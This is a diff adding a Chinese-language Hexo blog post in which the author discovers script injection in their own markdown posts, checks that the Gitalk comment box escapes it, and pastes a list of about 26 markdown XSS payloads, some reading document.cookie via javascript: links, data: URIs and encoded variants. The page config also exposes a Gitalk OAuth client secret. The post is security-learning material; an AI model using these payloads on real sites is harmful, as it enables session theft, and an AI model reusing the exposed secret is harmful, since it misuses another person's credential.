@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.0.0/css/all.min.css" integrity="sha256-jTIdiMuX/e3DGJUGwl3pKSxuc6YOuqtJYkM0bGQESA4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}}},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="今天出现了一个非常诡异的事件~~~">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss-on-markdown">
+<meta property="og:url" content="http://example.com/2022/04/29/xss-on-markdown/index.html">
+<meta property="og:site_name" content="b1ue0cean&#39;s   blog">
+<meta property="og:description" content="今天出现了一个非常诡异的事件~~~">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-04-29T06:59:32.000Z">
+<meta property="article:modified_time" content="2022-04-29T07:34:54.687Z">
+<meta property="article:author" content="b1ue0cean">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2022/04/29/xss-on-markdown/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/04/29/xss-on-markdown/","path":"2022/04/29/xss-on-markdown/","title":"xss-on-markdown"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>xss-on-markdown | b1ue0cean's   blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="b1ue0cean's   blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">b1ue0cean's   blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome to my world -- sharing CTF & ML skills</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">14</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">7</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">30</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="b1ue0cean"
+      src="/uploads/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">b1ue0cean</p>
+  <div class="site-description" itemprop="description">我就是我，人间不一样的烟火</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/godrun666" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;godrun666" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1019076587@qq.com" title="E-Mail → mailto:1019076587@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/b1ue0cean7" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;b1ue0cean7" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_53755216" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53755216" rel="noopener" target="_blank">CSDN</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/29/xss-on-markdown/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+      <meta itemprop="name" content="b1ue0cean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="b1ue0cean's   blog">
+      <meta itemprop="description" content="我就是我，人间不一样的烟火">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="xss-on-markdown | b1ue0cean's   blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          xss-on-markdown
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-04-29 14:59:32 / Modified: 15:34:54" itemprop="dateCreated datePublished" datetime="2022-04-29T14:59:32+08:00">2022-04-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sec/" itemprop="url" rel="index"><span itemprop="name">sec</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>今天出现了一个非常诡异的事件~~~</p>
+<span id="more"></span>
+
+<p>今天我在看自己的博客时发现  我的一篇文章被xss了！！！ 玩了 芭比q了  ！！ 我被站日了？</p>
+<p>赶紧调试了一下自己的本地仓库</p>
+<p>发现也没有被日？</p>
+<p>那究竟是发生了肾么事呢？</p>
+<p>首先 我想要找到我的被xss的点在哪里？</p>
+<p>终于调试了一下后 找到了这个点</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="type">text</span>/html,&lt;script&gt;top.<span class="keyword">location</span>.href = <span class="string">&#x27;javascript:alert(2333)&#x27;</span>&lt;/script&gt;:<span class="number">1</span> Unsafe attempt <span class="keyword">to</span> initiate navigation <span class="keyword">for</span> frame <span class="keyword">with</span> URL <span class="string">&#x27;file:///E:/js/test.html&#x27;</span> <span class="keyword">from</span> frame <span class="keyword">with</span> URL <span class="string">&#x27;data:text/html,&lt;script&gt;top.location.href = &#x27;</span>javascript:alert(<span class="number">1</span>)<span class="string">&#x27;&lt;/script&gt;&#x27;</span>. The frame attempting navigation must be same-origin <span class="keyword">with</span> the target <span class="keyword">if</span> navigating <span class="keyword">to</span> a javascript: url</span><br><span class="line"></span><br><span class="line">（匿名） @ data:<span class="type">text</span>/html,&lt;script&gt;top.<span class="keyword">location</span>.href = <span class="string">&#x27;javascript:alert(1)&#x27;</span>&lt;/script&gt;:<span class="number">1</span></span><br><span class="line">data:<span class="type">text</span>/html,&lt;script&gt;top.<span class="keyword">location</span>.href = <span class="string">&#x27;javascript:alert(1)&#x27;</span>&lt;/script&gt;:<span class="number">1</span> Uncaught DOMException: Failed <span class="keyword">to</span> <span class="keyword">set</span> the <span class="string">&#x27;href&#x27;</span> property <span class="keyword">on</span> <span class="string">&#x27;Location&#x27;</span>: The <span class="keyword">current</span> <span class="keyword">window</span> does <span class="keyword">not</span> have permission <span class="keyword">to</span> navigate the target frame <span class="keyword">to</span> <span class="string">&#x27;javascript:alert(1)&#x27;</span>.</span><br><span class="line">at data:<span class="type">text</span>/html,&lt;script&gt;top.<span class="keyword">location</span>.href = <span class="string">&#x27;javascript:alert(1)&#x27;</span>&lt;/script&gt;:<span class="number">1</span>:<span class="number">27</span></span><br></pre></td></tr></table></figure>
+
+<p>我当时以引用的方式 <code>&gt;</code> + content  结果导致这里出现了 xss</p>
+<p>然后我就开始思考了一个问题  虽然说最近也做了不少xss的题目 也研究了一些小细节 但是在markdown中这么容易出现xss会正常吗？</p>
+<p>还是说这是我的一个意想不到的小发现呢？</p>
+<p>我决定深入测试一下</p>
+<p>。。。</p>
+<p>接下来的测试 <code>&gt;</code> + <code>&lt;script&gt;alert``&lt;/script&gt;</code></p>
+<p>成功实现了xss emmm。。。</p>
+<p>其实直接 <code>&lt;script&gt;alert``&lt;/script&gt;</code> 同样ok</p>
+<p>这么容易就xss会对吗</p>
+<p>我用的是 hexo 模板   那也就是说 如果我拿到了文章编写者的权限就可以随意xss了？</p>
+<p><strong>后来想了一下是我大惊小怪了</strong>   <strong>我只是简单地更改了html</strong>  <strong>但hexo没有转义导致仍然会不安全？</strong></p>
+<p>那么评论区呢？ </p>
+<p>我随便x了一下</p>
+<p>结果如下 可以看得很清楚 这里被转义了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blockquote</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert``<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么这里是gittalk   我又没有什么办法能在这里实现xss?</p>
+<p>我们是否有可能bypass gittalk？我不知道 。。。</p>
+<p>找到了几个list</p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[<span class="name">XSS</span>](<span class="name">javascript:prompt</span>(<span class="name">document.cookie</span>))</span><br><span class="line">[<span class="name">XSS</span>](<span class="name">j</span>    a   v   a   s   c   r   i   p   t:prompt(<span class="name">document.cookie</span>))</span><br><span class="line">[<span class="name">XSS</span>](<span class="name">data:text/html</span><span class="comment">;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)</span></span><br><span class="line">[<span class="name">XSS</span>](<span class="name">&amp;</span><span class="number">#x6</span>A&amp;<span class="number">#x61</span>&amp;<span class="number">#x76</span>&amp;<span class="number">#x61</span>&amp;<span class="number">#x73</span>&amp;<span class="number">#x63</span>&amp;<span class="number">#x72</span>&amp;<span class="number">#x69</span>&amp;<span class="number">#x70</span>&amp;<span class="number">#x74</span>&amp;<span class="number">#x3</span>A&amp;<span class="number">#x61</span>&amp;<span class="number">#x6</span>C&amp;<span class="number">#x65</span>&amp;<span class="number">#x72</span>&amp;<span class="number">#x74</span>&amp;<span class="number">#x28</span>&amp;<span class="number">#x27</span>&amp;<span class="number">#x58</span>&amp;<span class="number">#x53</span>&amp;<span class="number">#x53</span>&amp;<span class="number">#x27</span>&amp;<span class="number">#x29</span>)</span><br><span class="line">[<span class="name">XSS</span>]: (<span class="name">javascript:prompt</span>(<span class="name">document.cookie</span>))</span><br><span class="line">[<span class="name">XSS</span>](<span class="name">javascript:window.onerror=alert</span><span class="comment">;throw%20document.cookie)</span></span><br><span class="line">[<span class="name">XSS</span>](<span class="name">javascript://%0d%0aprompt</span>(<span class="name">1</span>))</span><br><span class="line">[<span class="name">XSS</span>](<span class="name">javascript://%0d%0aprompt</span>(<span class="name">1</span>)<span class="comment">;com)</span></span><br><span class="line">[<span class="name">XSS</span>](<span class="name">javascript:window.onerror=alert</span><span class="comment">;throw%20document.cookie)</span></span><br><span class="line">[<span class="name">XSS</span>](<span class="name">javascript://%0d%0awindow.onerror=alert</span><span class="comment">;throw%20document.cookie)</span></span><br><span class="line">[<span class="name">XSS</span>](<span class="name">data:text/html</span><span class="comment">;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)</span></span><br><span class="line">[<span class="name">XSS</span>](<span class="name">vbscript:alert</span>(<span class="name">document.domain</span>))</span><br><span class="line">[<span class="name">XSS</span>](<span class="name">javascript:this</span><span class="comment">;alert(1))</span></span><br><span class="line">[<span class="name">XSS</span>](<span class="name">javascript:this</span><span class="comment">;alert(1&amp;#41;)</span></span><br><span class="line">[<span class="name">XSS</span>](<span class="name">javascript&amp;</span>#<span class="number">58</span>this<span class="comment">;alert(1&amp;#41;)</span></span><br><span class="line">[<span class="name">XSS</span>](<span class="name">Javas&amp;</span>#<span class="number">99</span><span class="comment">;ript:alert(1&amp;#41;)</span></span><br><span class="line">[<span class="name">XSS</span>](<span class="name">Javas%26%2399</span><span class="comment">;ript:alert(1&amp;#41;)</span></span><br><span class="line">[<span class="name">XSS</span>](<span class="name">javascript:alert&amp;</span>#<span class="number">65534</span><span class="comment">;(1&amp;#41;)</span></span><br><span class="line">[<span class="name">XSS</span>](<span class="name">javascript:confirm</span>(<span class="name">1</span>)</span><br><span class="line">[<span class="name">XSS</span>](<span class="name">javascript://www.google.com%0Aprompt</span>(<span class="name">1</span>))</span><br><span class="line">[<span class="name">XSS</span>](<span class="name">javascript://%0d%0aconfirm</span>(<span class="name">1</span>)<span class="comment">;com)</span></span><br><span class="line">[<span class="name">XSS</span>](<span class="name">javascript:window.onerror=confirm</span><span class="comment">;throw%201)</span></span><br><span class="line">[<span class="name">XSS</span>](<span class="name">�javascript:alert</span>(<span class="name">document.domain&amp;</span>#<span class="number">41</span><span class="comment">;)</span></span><br><span class="line">![<span class="name">XSS</span>](<span class="name">javascript:prompt</span>(<span class="name">document.cookie</span>))\</span><br><span class="line">![<span class="name">XSS</span>](<span class="name">data:text/html</span><span class="comment">;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\</span></span><br><span class="line">![<span class="name">XSS</span>&#x27;<span class="string">&quot;`onerror=prompt(document.cookie)](x)\</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>我是否能绕个什么过滤器之类的？</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>b1ue0cean
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="http://example.com/2022/04/29/xss-on-markdown/" title="xss-on-markdown">http://example.com/2022/04/29/xss-on-markdown/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="https://twitter.com/b1ue0cean7">
+          <span class="icon">
+            <i class="fab fa-twitter"></i>
+          </span>
+
+          <span class="label">Twitter</span>
+        </a>
+      </div>
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class=""></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/xss/" rel="tag"># xss</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/04/28/suid/" rel="prev" title="suid提权">
+                  <i class="fa fa-chevron-left"></i> suid提权
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"godrun666","repo":"godrun666.github.io","client_id":"7f8a0f5a5c88a0fea952","client_secret":"57250fa3a3b4cb1d0e0dad43bb1fffe7355d61a8","admin_user":"godrun666","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"b5ee704bd275251101c7f226eb5f478d"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
